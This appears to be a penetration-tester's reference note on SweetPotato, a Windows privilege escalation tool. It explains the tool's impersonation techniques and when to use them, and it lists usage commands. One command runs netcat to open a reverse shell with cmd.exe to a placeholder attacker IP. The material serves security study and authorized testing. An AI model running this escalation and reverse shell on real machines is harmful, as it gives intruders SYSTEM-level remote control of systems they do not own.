---
created: 2026-07-21
tags:
  - Windows
  - Windows_PrivEsc
status: substantial
---
## SweetPotato

> **[SweetPotato](https://github.com/CCob/SweetPotato)** is an all-in-one privilege escalation tool that bundles multiple potato techniques into a single C# binary. It automatically selects the best available method based on the target OS version.

> [!warning]+ Compatibility
> - Works on **Windows 7** through **Windows Server 2019+**.
> - Requires `SeImpersonatePrivilege`.
> - .NET-based; compatible with in-memory execution (`execute-assembly` in Cobalt Strike, etc.).

- SweetPotato combines:
	- **DCOM/NTLM reflection** (similar to [[JuicyPotato]]) — used on older builds where the OXID restriction is not in place.
	- **BITS/WinRM abuse** — on newer builds (`1809`+), SweetPotato triggers the **BITS** (Background Intelligent Transfer Service) COM object. Upon startup, BITS attempts to connect to the local **WinRM** service on port `5985`. If WinRM is not running, SweetPotato binds to port `5985` and captures the `SYSTEM` NTLM authentication from BITS.
	- **PrintSpoofer-style** named pipe impersonation — some variants include the Print Spooler coercion path.

> [!important] The BITS/WinRM method only works if **WinRM is not already running** (port `5985` must be free). WinRM is typically running on Windows Server installations, making this method unreliable on servers.

### Practical exploitation

```bash
wget https://github.com/CCob/SweetPotato/releases/download/v2.0.0/SweetPotato.exe
```

```powershell
SweetPotato.exe -p cmd.exe -a "/c whoami"
```

```powershell
SweetPotato.exe -p cmd.exe -a "/c nc.exe <attacker_ip> <port> -e cmd.exe"
```

> [!tip] SweetPotato auto-selects the best method. For manual control, use [[PrintSpoofer]], [[RoguePotato]], or [[GodPotato]] directly.

### When to use SweetPotato

- You need a **single binary** that adapts to the target OS version.
- You're operating from a **C2 framework** (Cobalt Strike, Sliver) and want in-memory execution via `execute-assembly`.
- You want to try **multiple techniques** without transferring separate tools.

For fine-grained control or when SweetPotato fails, use the dedicated tools:

| Scenario | Use |
| --- | --- |
| Target ≤ Windows 10 `1803` / Server 2016 | [[JuicyPotato]] |
| Print Spooler running | [[PrintSpoofer]] |
| Remote machine available on port `135` | [[RoguePotato]] |
| Universal, no dependencies | [[GodPotato]] |

## References and further reading

- [`SweetPotato — GitHub (CCob)`](https://github.com/CCob/SweetPotato)
- [`We thought they were potatoes but they were beans — Decoder's Blog`](https://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/)
- [`Potatoes — Windows Privilege Escalation — Jorge Lajara`](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
